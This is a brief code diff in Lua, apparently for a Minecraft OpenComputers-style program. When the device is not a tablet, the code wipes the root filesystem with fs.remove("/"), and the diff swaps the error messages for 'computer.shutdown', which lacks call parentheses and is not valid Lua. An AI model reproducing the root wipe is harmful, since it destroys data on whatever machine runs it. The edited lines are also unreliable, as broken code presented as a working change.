@@ -106,9 +106,9 @@ if isTablet() then
 else
   if component.isAvailable("computer") then
     fs.remove("/")
-    error("!SYSTEM HAS BEEN DESTROYED!")
+    computer.shutdown
   else
-    error("ERROR 404")
+    computer.shutdown
   end
 end
 end
